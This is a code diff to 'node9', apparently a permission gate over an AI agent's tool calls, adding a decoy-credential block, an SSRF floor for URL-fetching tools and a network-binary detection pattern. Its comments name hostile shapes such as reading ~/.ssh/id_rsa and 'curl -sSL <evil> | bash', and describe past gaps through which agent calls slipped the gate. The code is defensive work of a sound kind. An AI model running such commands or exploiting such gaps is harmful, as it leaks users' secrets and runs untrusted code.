@@ -3,8 +3,14 @@
 import { randomUUID } from 'crypto';
 import { askNativePopup } from '../ui/native';
 import { computeRiskMetadata, type RiskMetadata } from '../context-sniper';
-import { scanArgs, scanFilePath, detectArgsPii, type DlpMatch } from '../dlp';
-import { extractShellDestinations, evaluateEgress } from '@node9/policy-engine';
+import { scanArgs, scanFilePath, detectArgsPii, matchCanaryArgs, type DlpMatch } from '../dlp';
+import { canaryValues, loadCanaries } from '../canary/registry';
+import { ssrfDestinationFloor, NET_BINARIES } from '@node9/policy-engine';
+import {
+  extractShellDestinations,
+  extractToolDestinations,
+  evaluateEgress,
+} from '@node9/policy-engine';
 import { appendHookDebug, appendLocalAudit, appendToLog, HOOK_DEBUG_LOG } from '../audit';
 import { getConfig, getCredentials } from '../config';
 import { isIgnoredTool, evaluatePolicy } from '../policy';
@@ -32,6 +38,7 @@ import { initNode9SaaS, pollNode9SaaS, resolveNode9SaaS } from './cloud';
 import { recordAndCheck } from '../loop-detector';
 import { readActiveShields } from '../shields';
 import { findJailedPath, findJailedPathIn, USER_JAIL_SHIELD } from '../shields/jail';
+import { safeMessage } from '../utils/safe-text';
 
 export interface AuthResult {
   approved: boolean;
@@ -52,14 +59,7 @@ export interface AuthResult {
     | 'timeout';
   changeHint?: string;
   checkedBy?:
-    | 'cloud'
-    | 'daemon'
-    | 'terminal'
-    | 'local-policy'
-    | 'persistent'
-    | 'trust'
-    | 'paused'
-    | 'audit';
+    'cloud' | 'daemon' | 'terminal' | 'local-policy' | 'persistent' | 'trust' | 'paused' | 'audit';
   /** Structured decision source from the winning racer — used for cloud audit reporting. */
   decisionSource?: 'terminal' | 'browser' | 'native' | 'cloud' | 'timeout' | 'local';
   /** Name of the smart rule that fired (for HUD lastRuleHit tracking). */
@@ -129,13 +129,27 @@ function extractFilePaths(toolName: string, args: unknown): string[] {
  * Returns true if this is a shell/network tool that could exfiltrate a file.
  * Used to decide whether to run a taint check.
  */
+// Built from the engine's NET_BINARIES so this list and the destination
+// extractor's cannot drift.
+//
+// The lookbehind is the whole fix and its SHAPE matters. A bare `\b` matched
+// `ssh` INSIDE `.ssh/`, so `cat < ~/.ssh/id_rsa` was classed as a network call,
+// entered the taint tier, and with the daemon down came back `ask` ("Taint
+// service unavailable") instead of the jail's block. A command-POSITION anchor
+// (`^` or whitespace) fixes that but DROPS `/usr/bin/curl`, `sh -c "curl …"`
+// and `{curl …;}` -- all matched before, all real network calls, all would
+// silently leave the taint tier. The discriminator between the two is a DOT:
+// `.ssh` is a dotfile, while a slash or a quote before the name is just a path
+// or a payload. Measured over 13 shapes, 2026-09-11.
+const NETWORK_COMMAND_RE = new RegExp(`(?<![.\\w-])(${[...NET_BINARIES].join('|')})\\b`);
+
 function isNetworkTool(toolName: string, args: unknown): boolean {
   const t = toolName.toLowerCase();
   if (t === 'bash' || t === 'shell' || t === 'run_shell_command' || t === 'terminal.execute') {
     const a = args as Record<string, unknown> | null;
     const cmd =
       typeof a?.command === 'string' ? a.command : typeof a?.cmd === 'string' ? a.cmd : '';
-    return /\b(curl|wget|scp|rsync|nc|ncat|netcat|ssh)\b/.test(cmd);
+    return NETWORK_COMMAND_RE.test(cmd);
   }
   return false;
 }
@@ -188,6 +202,38 @@ export async function hasReachableHumanApprover(opts: {
   return opts.approvers.terminal !== false && (await daemonHasInteractiveApprover());
 }
 
+/**
+ * Whether a hard block may soften into a review/recovery card.
+ *
+ * A block softens ONLY when a genuine human approver is reachable (a GUI popup
+ * or a connected `node9 tail`). With none — CI, headless, a piped
+ * non-interactive agent — it stays hard, so the approver race can never resolve
+ * it to allow (a cloud immediate-allow of a client-side shield the SaaS has no
+ * rule for). Cloud is deliberately not a "human": it can auto-resolve.
+ *
+ * `overridable: false` refuses the downgrade outright, whatever else is true.
+ * That is the SSRF tier-1 floors, whose reason string already promises the user
+ * "This address cannot be allowlisted". Before this, a reachable human turned
+ * that promise into a dialog, and on a governed desktop the metadata endpoint
+ * was allowed while `node9 explain` still said BLOCK.
+ *
+ * `!== false` and not `=== true`: every verdict that carries no opinion keeps
+ * the previous behaviour. Only an explicit "no one may override this" changes.
+ *
+ * Pure, and extracted for the same reason resolveNativeDecision is: the live
+ * condition includes `isTestEnv`, so a test running under vitest can never
+ * observe a downgrade through the real path.
+ */
+export function mayDowngradeHardBlock(opts: {
+  daemonUp: boolean;
+  isTestEnv: boolean;
+  humanApproverReachable: boolean;
+  overridable?: boolean;
+}): boolean {
+  if (opts.overridable === false) return false;
+  return opts.daemonUp && !opts.isTestEnv && opts.humanApproverReachable;
+}
+
 export async function authorizeHeadless(
   toolName: string,
   args: unknown,
@@ -217,11 +263,9 @@ export async function authorizeHeadless(
     // clock starts before any I/O side effects, and fake timers become usable.
     // Strip ANSI escape sequences — agent / mcpServer come from caller-supplied
     // metadata and may be displayed in a terminal (node9 tail/watch), enabling
-    // injection. Same regex as agent below; mcpServer is shorter (40 chars max).
-    const stripAnsi = (s: string): string =>
-      s.replace(/\x1b(?:\[[0-9;?]*[a-zA-Z]|\][^\x07\x1b]*(?:\x07|\x1b\\)|[@-_])/g, '');
-    const sanitizedAgent = meta?.agent ? stripAnsi(meta.agent).slice(0, 80) : undefined;
-    const sanitizedMcpServer = meta?.mcpServer ? stripAnsi(meta.mcpServer).slice(0, 40) : undefined;
+    // injection. mcpServer is capped shorter (40 chars) than agent (80).
+    const sanitizedAgent = meta?.agent ? safeMessage(meta.agent, 80) : undefined;
+    const sanitizedMcpServer = meta?.mcpServer ? safeMessage(meta.mcpServer, 40) : undefined;
 
     const socketOk = await notifyActivity({
       id: actId,
@@ -269,6 +313,26 @@ export async function authorizeHeadless(
     return result;
   }
   return _authorizeHeadlessCore(toolName, args, meta, options);
+}
+
+/**
+ * The message shown when the gate asked for approval and nobody answered.
+ *
+ * Exported so the copy can be asserted directly: the live one is built inside
+ * a setTimeout in a promise race, and a test that drove the whole race would
+ * be proving the wording by reconstructing the thing that produces it.
+ *
+ * The second line is the point. This is the moment the product has just cost
+ * someone work, which makes it the one place a call to action is welcome
+ * rather than an interruption. It names `node9 login`, which with no argument
+ * opens the browser and needs nothing prepared -- unlike `node9 connect`,
+ * which requires a token minted in the dashboard.
+ */
+export function approvalTimeoutReason(approvalTimeoutMs: number): string {
+  return (
+    `No human response within ${approvalTimeoutMs / 1000}s — auto-denied by timeout policy. ` +
+    'Approve from your phone next time: run `node9 login`.'
+  );
 }
 
 async function _authorizeHeadlessCore(
@@ -449,6 +513,100 @@ async function _authorizeHeadlessCore(
     }
   }
 
+  // ── CANARY (DECOY CREDENTIAL) GATE ────────────────────────────────────────
+  // A value node9 planted itself has no legitimate path into any tool call.
+  // So this runs BEFORE the DLP scanner, independent of dlp.enabled and of the
+  // ignored-tool list, and a hit is a hard block even where the regex DLP
+  // would only review (design: doc/roadmap/active/canary-design.md; H15, E5).
+  // The registry is read per call; a read failure means "no canaries" so the
+  // gate can never crash a tool call.
+  const canaryVals = safeCanaryValues();
+  if (canaryVals.length > 0) {
+    const canaryHit = matchCanaryArgs(args, canaryVals);
+    if (canaryHit) {
+      const rec = canaryRecordById(canaryHit.id);
+      // Attribution only: the shape path may have fired on the same value;
+      // both attributions ride one row (E1, E6).
+      const shape = scanArgs(args);
+      const canaryReason =
+        `🚨 DECOY CREDENTIAL: the fake ${rec?.kind ?? 'credential'} node9 planted at ` +
+        `${rec?.path ?? 'a decoy file'} appeared in field "${canaryHit.fieldPath || 'args'}". ` +
+        `Something read that file; nothing legitimate does.`;
+      if (!isManual)
+        appendLocalAudit(
+          toolName,
+          args,
+          'deny',
+          isObserveMode ? 'observe-mode-dlp-canary-would-block' : 'dlp-canary-block',
+          {
+            ...meta,
+            canaryId: canaryHit.id,
+            canaryHash: rec?.valueHash,
+            canaryKind: rec?.kind,
+            canaryPath: rec?.path,
+            canaryView: canaryHit.view,
+            canaryRetired: canaryHit.retired,
+            ...(shape ? { dlpPattern: shape.patternName, dlpSample: shape.redactedSample } : {}),
+          },
+          true
+        );
+      if (isObserveMode) {
+        return {
+          approved: true,
+          checkedBy: 'audit',
+          observeWouldBlock: true,
+          blockedByLabel: '🚨 Node9 DLP (Decoy Credential)',
+        };
+      }
+      return {
+        approved: false,
+        reason: canaryReason,
+        blockedBy: 'local-config',
+        blockedByLabel: '🚨 Node9 DLP (Decoy Credential)',
+        // The /dev/tty banner renders ruleDescription under "Triggered by".
+        // Without it the terminal said only "Decoy Credential" and never named
+        // the file, while `node9 canary plant` promises node9 tells you which
+        // file was read. Witnessed by canary-block-message.spec.ts, which calls
+        // the orchestrator directly: this field never reaches the hook stdout.
+        ruleDescription: `The fake credential node9 planted in ${rec?.path ?? 'a decoy file'} just left that file. Nothing legitimate reads it.`,
+      };
+    }
+  }
+
+  // ── SSRF FLOOR, NON-SHELL DESTINATIONS ────────────────────────────────────
+  // A tool that fetches a URL itself never produces a shell command, so the
+  // floor inside evaluatePolicy cannot see it — and WebFetch, get_*, read_*
+  // and list_* are on the ignoredTools list, so it never reaches evaluatePolicy
+  // at all. Measured: `curl http://<metadata>/` blocked while the same address
+  // through WebFetch was allowed.
+  //
+  // So this runs here, beside the canary gate and before the ignored-tool fast
+  // path, on the same principle: a protected address in a declared destination
+  // argument has no legitimate path into a tool call. It calls the SAME engine
+  // function evaluatePolicy calls, so the gate and `node9 explain` cannot
+  // disagree. A closed list of tool + argument paths, never a scan: see
+  // egress/destinations.ts for why that is the only safe shape.
+  {
+    const dest = ssrfDestinationFloor(toolName, args, {
+      ssrfAllow: config.policy.egress?.ssrfAllow,
+      ssrfStrict: config.policy.egress?.ssrfStrict,
+    });
+    if (dest && !isObserveMode) {
+      if (!isManual)
+        appendLocalAudit(toolName, args, 'deny', 'ssrf-destination', meta, hashAuditArgs);
+      return {
+        approved: false,
+        checkedBy: 'local-policy',
+        blockedByLabel: '🌐 Node9 Egress (Protected Address)',
+        reason: dest.reason,
+        // AuthResult carries no ruleName; the rule identity the audit row needs
+        // travels in ruleHit, as it does for a smart-rule block.
+        ruleHit: `ssrf:${dest.tier}:${toolName}:${dest.host}`,
+        ruleDescription: dest.reason,
+      };
+    }
+  }
+
   // ── DLP CONTENT SCANNER ───────────────────────────────────────────────────
   // Runs before ignored-tool fast path and audit mode so that a leaked
   // credential is always caught — even for "safe" tools like web_search.
@@ -567,8 +725,29 @@ async function _authorizeHeadlessCore(
     }
   }
 
+  // ── G10: a tool on the ignored list that DECLARES a destination ──────────
+  // WebFetch is on ignoredTools, so with the guards below it never reached
+  // evaluatePolicy and the egress policy was shell-only (measured 2026-09-20:
+  // curl denied, WebFetch to the same host allowed, under mode:block). When
+  // egress is on and the call carries a declared destination (the closed list
+  // in egress/destinations.ts, the same one the floor above reads), it is
+  // handed to the engine, whose egress verdict is computed BEFORE its ignored
+  // fast path and returned there. The ENGINE builds the verdict, so
+  // `node9 explain` and this gate cannot disagree.
+  //
+  // NOT skipIgnoredFastPath. The jail guard needs that door because its rules
+  // live after the fast path; egress does not, and passing it opened the whole
+  // engine tail to an ignored tool: measured on a strict-mode machine, every
+  // ALLOWLISTED WebFetch became a review ("Global Config (Strict Mode
+  // Active)") while explain, which passes no flag, still said ALLOW. That is
+  // the G8 explain/gate gap, reintroduced by the fix that was meant to close
+  // it. The engine's own fast path returns the egress verdict or allow.
+  const declaredEgress =
+    config.policy.egress?.enabled === true && extractToolDestinations(toolName, args).length > 0;
+  const judge = !isIgnoredTool(toolName) || declaredEgress;
+
   if (isObserveMode) {
-    if (!isIgnoredTool(toolName)) {
+    if (judge) {
       const policyResult = await evaluatePolicy(toolName, args, meta?.agent, options?.cwd);
       const wouldBlock = policyResult.decision === 'block';
       if (!isManual)
@@ -594,7 +773,7 @@ async function _authorizeHeadlessCore(
   }
 
   if (config.settings.mode === 'audit') {
-    if (!isIgnoredTool(toolName)) {
+    if (judge) {
       const policyResult = await evaluatePolicy(toolName, args, meta?.agent, options?.cwd);
       if (policyResult.decision === 'review') {
         // Local row only — the outbox shipper delivers it to the SaaS.
@@ -670,15 +849,21 @@ async function _authorizeHeadlessCore(
   // NOTE: appPermReview does NOT skip this block (fix #3) — the policy must run so
   // a hard-block verdict still wins. The ALLOW-returns inside are individually
   // guarded with `!appPermReview` so a review-marked tool can't auto-allow.
-  if (!taintWarning && !isIgnoredTool(toolName)) {
+  if (!taintWarning && judge) {
     // ── LOOP DETECTION ────────────────────────────────────────────────────
     // Skipped for an org-set review (re-review regression fix): reopening this
     // block for fix #3 re-enabled loop detection, which would hard-deny a
     // review-marked tool BEFORE its approval card ever shows (an agent retrying
     // after a human deny trips the threshold). A review must always reach the
     // human; the human's own deny is the throttle.
+    // G10: and skipped for a tool admitted by `judge` alone. An ignored tool
+    // never reached this counter before; arming it because egress is ON turned
+    // an agent re-fetching the same page into a hard "Loop Detected" deny
+    // (measured: six identical WebFetch calls to an ALLOWLISTED host went
+    // allow, allow, allow, allow, deny, deny). Egress judges the destination,
+    // not the repetition.
     const ld = config.policy.loopDetection;
-    if (ld.enabled && !appPermReview) {
+    if (ld.enabled && !appPermReview && !isIgnoredTool(toolName)) {
       const loopResult = recordAndCheck(toolName, args, ld.threshold, ld.windowSeconds * 1000);
       if (loopResult.looping) {
         const reason =
@@ -781,12 +966,12 @@ async function _authorizeHeadlessCore(
           calledFromDaemon: options?.calledFromDaemon,
         });
       }
-      // A hard block softens into a review/recovery card ONLY when a genuine
-      // human approver is reachable (GUI popup or connected tail). With none —
-      // CI, headless, a piped non-interactive agent — it stays hard so the
-      // approver race can never resolve it to allow (a cloud immediate-allow of
-      // a client-side shield the SaaS has no rule for). Fails closed.
-      const mayDowngrade = daemonUp && !isTestEnv && humanApproverReachable;
+      const mayDowngrade = mayDowngradeHardBlock({
+        daemonUp,
+        isTestEnv,
+        humanApproverReachable,
+        overridable: policyResult.overridable,
+      });
 
       // The audit row + hard-block result, shared by every non-softening path so
       // a fail-closed decision is a single call.
@@ -1071,14 +1256,6 @@ async function _authorizeHeadlessCore(
     }
   }
 
-  // Trust session bypass — only for review-path calls, never for taint detection.
-  // Runs after hard-block evaluation so block-verdict rules are always enforced.
-  // Round-3 F1b: a DOWNGRADED hard block (an intrinsic exfil/RCE block softened
-  // to review) must not be resolved by a prior time-boxed "always allow" trust
-  // grant either — same non-human-channel class as the persistent consult
-  // (:951) and the cloud guards below. Trust matches on the first two command
-  // words, so a benign `curl -sSL <x>` grant would otherwise auto-allow a later
-  // `curl -sSL <evil> | bash`. Fail closed: a downgraded block skips trust.
   if (
     !taintWarning &&
     !appPermReview &&
@@ -1317,7 +1494,7 @@ async function _authorizeHeadlessCore(
         const timer = setTimeout(() => {
           resolve({
             approved: false,
-            reason: `No human response within ${approvalTimeoutMs / 1000}s — auto-denied by timeout policy.`,
+            reason: approvalTimeoutReason(approvalTimeoutMs),
             blockedBy: 'timeout',
             blockedByLabel: 'Approval Timeout',
           });
@@ -1637,4 +1814,21 @@ async function _authorizeHeadlessCore(
 export async function authorizeAction(toolName: string, args: unknown): Promise<boolean> {
   const result = await authorizeHeadless(toolName, args);
   return result.approved;
+}
+
+// ── Canary registry access for the gate ─────────────────────────────────────
+/** A registry read failure means "no canaries": the gate must never throw into a tool call. */
+function safeCanaryValues() {
+  try {
+    return canaryValues();
+  } catch {
+    return [];
+  }
+}
+function canaryRecordById(id: string) {
+  try {
+    return loadCanaries().find((r) => r.id === id) ?? null;
+  } catch {
+    return null;
+  }
 }
